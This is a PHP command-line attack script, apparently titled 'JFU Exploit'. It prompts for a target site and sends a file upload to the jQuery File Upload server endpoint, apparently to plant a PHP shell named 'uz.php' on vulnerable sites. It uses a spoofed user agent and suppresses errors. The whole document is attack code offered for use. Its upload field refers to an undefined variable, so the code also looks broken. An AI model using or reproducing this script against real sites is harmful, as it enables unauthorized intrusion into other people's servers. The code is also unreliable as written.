<?php
error_reporting(0);


  echo "###########################\n";
  echo "#       JFU Exploit       #\n";
  echo "#   Created By MarsHall   #\n";
  echo "###########################\n";
  echo "Masukkan Target : ";
  $target = trim(fgets(STDIN));
  
  
$uploadfile="uz.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$target/jquery-file-upload/server/php/");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36');
curl_setopt($ch, CURLOPT_POST, true); 
curl_setopt($ch, CURLOPT_POSTFIELDS, array('fileToUpload'=>"@$files []"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
$gagal = curl_error($ch);
curl_close($ch);
    
echo "\n$postResult\n";
?>
